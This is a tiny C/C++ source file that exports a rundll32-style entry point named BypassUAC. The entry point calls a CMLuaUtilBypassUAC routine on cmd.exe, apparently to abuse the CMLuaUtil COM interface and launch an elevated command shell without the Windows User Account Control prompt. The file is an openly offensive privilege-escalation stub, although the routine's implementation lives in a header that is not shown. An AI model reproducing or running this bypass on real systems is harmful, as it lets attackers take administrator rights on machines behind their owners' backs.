#include "header.h"
#include "CBypassUAC.h"




void CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow)
{
	CMLuaUtilBypassUAC(L"C:\\Windows\\System32\\cmd.exe");
}